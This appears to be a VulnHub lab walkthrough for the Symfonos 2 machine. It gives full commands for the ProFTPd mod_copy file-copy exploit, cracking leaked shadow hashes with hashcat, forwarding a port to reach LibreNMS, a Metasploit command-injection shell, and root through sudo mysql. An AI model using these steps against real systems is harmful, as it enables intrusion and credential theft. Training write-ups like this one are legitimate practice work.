---
title: "Symfonos 2"
date: 2021-05-27T10:19:27+05:30
draft: false
toc: false
images:
tags:
  - VulnHub
  - FTP
  - SMB
  - Metasploit
---

## Symfonos 2 VulnHub Walkthrough

### Recon & Enumeration

- `sudo netdiscover -i eth0 -r 10.0.2.0/24`
- Symfonos IP => 10.0.2.11  

#### RustScan + Nmap

- `sudo rustscan -a 10.0.2.9 -- -sS -sC -A`

```
10.0.2.11:21 => ProFTPD 1.3.5
10.0.2.11:22 => OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
10.0.2.11:80  => WebFS httpd 1.21
10.0.2.11:139 => Samba smbd 3.X - 4.X
10.0.2.11:445 => Samba smbd 4.5.16-Debian
```

#### Searchsploit

- `searchsploit WebFS` 
- WebFS 1.x => [WebFS 1.x Pathname Buffer Overrun with FTP](https://www.exploit-db.com/exploits/23196) 
- `searchsploit ProFTP 1.3` 
- ProFTPd 1.3.5 => 'mod_copy' Command Execution (Metasploit) | `linux/remote/37262.rb` 
- ProFTPd 1.3.5 => 'mod_copy' Remote Command Execution | `linux/remote/36803.py` 
- ProFTPd 1.3.5 => File Copy | `linux/remote/36742.txt` 
- ProFTPd 1.3.5 File Copy vulnerability suggests the possibility of copying files using an unauthenticated user on FTP. 

#### SMB

- `nmap --script smb-enum-* -p 139,445 10.0.2.11` 

```
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-domains: 
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   SYMFONOS2
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled
| smb-enum-sessions: 
|_  <nobody>
| smb-enum-shares: 
|   account_used: guest
|   \\10.0.2.11\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.5.16-Debian)
|     Users: 4
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.0.2.11\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\aeolus\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.0.2.11\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

---

#### Enum4Linux

- `enum4linux -a 10.0.2.9`

```
Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\aeolus (Local User)
S-1-22-1-1001 Unix User\cronus (Local User)
```

---

- We have 2 usernames: `aeolus` and `cronus`. 
- We have FTP and SSH running on `symfonos` so we could attempt to brute force FTP and SSH with these usernames and `rockyou.txt` but lets quickly check if we can get anything on SMB. 
- `smbclient --no-pass -L //10.0.2.11/` 
- There was no directory listing on `IPC$` and `print$` shares but `anonymous` had it.
- `smbclient --no-pass //10.0.2.11/anonymous`
```
smb: \> ls
	backups    D  0  Thu Jul 18 19:55:17 2019
smb: \> cd backups
smb: \backups\> ls
	log.txt    N  11394  Thu Jul 18 19:55:16 2019
smb: \backups\> get log.txt
```

- `cat log.txt` reveals some useful information like usernames, paths and some commands by `root` user. Below, I have added the information that I felt was relevant. 

```
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf

[anonymous]
   path = /home/aeolus/share
   browseable = yes
   read only = yes
   guest ok = yes
   
# Normally, we want files to be overwriteable.
AllowOverwrite		on

# We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias			anonymous ftp
```

---

### Exploitation

#### FTP Exploitation 

ProFTPd 1.3.5 => File Copy Exploit

```
/usr/share/exploitdb/exploits/linux/remote/36742.txt
```

- `/home/aeolus/share/backups` - path to that anonymous share we got from `log.txt`
- `ftp 10.0.2.11` => hit enter twice to get unauthenticated user access. This unauthenticated access is enough to exploit this FTP file copy vulnerability.

```
ftp 10.0.2.11
Connected to 10.0.2.11.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.0.2.11]
Name (10.0.2.11:kali): 
331 Password required for kali
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> site help
214-The following SITE commands are recognized (* =>'s unimplemented)
 CPFR <sp> pathname
 CPTO <sp> pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@symfonos2
---
ftp> site cpfr /etc/passwd
350 File or directory exists, ready for destination name
ftp> site cpto /home/aeolus/share/passwd
250 Copy successful
ftp> site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
ftp> site cpto /home/aeolus/share/shadow.bak
250 Copy successful
ftp> 
```

- Now we can access this `shadow.bak` file from the `anonymous` share. 
- `smbclient --no-pass //10.0.2.11/anonymous`

![Symfonos 2 SMB Share - anonymous](/imgs/symfonos2/symfonos2_smb_share_anonymous.png)

- `get` both the files `passwd` and `shadow.bak` and then we will try to crack the hashes. 

- Contents of `/var/backups/shadow.bak`: 

```
root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7:::
aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::
```

- Lets add the 3 users `root`, `aeolus`, and `cronus` with their respective hashes to `crack.txt` and attempt to brute force them with `hashcat`. 

#### Hashcat

- `hashid -m crack.txt` => 1800

```
hashcat -m 1800 -w 3 crack.txt /usr/share/wordlists/rockyou.txt -O
```

- And we get the credentials for user `aeolus`. 
- `aeolus:sergioteamo`
- We could have also gotten these credentials by brute forcing SSH and FTP with `hydra` but this FTP file copy exploit method was more interesting. 

#### SSH User Access

- `ssh aeolus@10.0.2.11` => yes => `sergioteamo` 
- And we are logged in as `aeolus` 
- As we can see, our access is pretty limited so lets try running Linux Smart Enumeration script `lse.sh`. We can just `wget` this as raw directly from GitHub to `/home/aeolus` directory and `chmod +x lse.sh` and run it. 

```
[*] net000 Services listening only on localhost............................ yes!
```

- So there are some services running on localhost on `symfonos` and seems like we have access to `nmap`. 
- `nmap -p- 127.0.0.1`

```
127.0.0.1:3306 => MySQL
127.0.0.1:8080 => HTTP Proxy
```

![Symfonos 2 nmap localhost](/imgs/symfonos2/symfonos2_nmap_localhost.png)


- `nmap -A -p 3306,8080 127.0.0.1`

```
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00015s latency).
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.5-10.1.38-MariaDB-0+deb9u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.38-MariaDB-0+deb9u1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, LongPassword, ConnectWithDatabase, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, IgnoreSigpipes, SupportsLoadDataLocal, Speaks41ProtocolNew, LongColumnFlag, ODBCClient, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: `dWg!hmhBPLkVM]n2J^|
|_  Auth Plugin Name: 103
8080/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://localhost/login
```

- HTTP service is running on `localhost:8080`. To access this website, we will need forward this port `8080` to our Kali VM. 

#### SSH Local Port Forwarding

`ssh -L $LOCAL_PORT:$REMOTE_IP:$REMOTE_PORT $USER@$SERVER` 

`ssh -L 8081:localhost:8080 aeolus@10.0.2.11` => `sergioteamo` 

- `$LOCAL_PORT`: open port on local machine (Kali VM)
- `$LOCAL_IP`: `localhost` or machine from local network
- `$REMOTE_IP`: remote `localhost` or IP from remote network
- `$REMOTE_PORT`: open port on remote site

---

- Now on Kali VM, if we visit `http://localhost:8081`, we get redirected to `http://localhost:8081/login` 

- `searchsploit librenms` 

```
LibreNMS - addhost Command Injection (Metaspl | linux/remote/46970.rb
LibreNMS - Collectd Command Injection (Metasp | linux/remote/47375.rb
LibreNMS 1.46 - 'addhost' Remote Code Executi | php/webapps/47044.py
LibreNMS 1.46 - 'search' SQL Injection        | multiple/webapps/48453.txt
LibreNMS 1.46 - MAC Accounting Graph Authenti | multiple/webapps/49246.py
```

- Try `php/webapps/47044.py` later. For now, I'll use Metasploit. 

#### Metasploit

- `search librenms` 

- ```
  use exploit/linux/http/librenms_addhost_cmd_inject
  ```
- `show options` 
- `set` all the values. It should look like this. 

![Symfonos 2 LibreNMS Metasploit Options](/imgs/symfonos2/symfonos2_libreNMS_metasploit_options.png)

- `exploit` or `run` to exploit. And we get a shell. 
- `whoami` => `cronus` 

---

### Privilege Escalation

- `sudo -l` => `mysql` 
- [GTFOBins MySQL](https://gtfobins.github.io/gtfobins/mysql/#shell) 
- `mysql -e '\! /bin/sh'` 

![Symfonos 2 MySQL Privilege Escalation](/imgs/symfonos2/symfonos2_mysql_privilege_escalation.png)

- `whoami` => `root` 
- `cat /root/proof.txt` 

![symfonos2_root_proof.png](/imgs/symfonos2/symfonos2_root_proof.png)

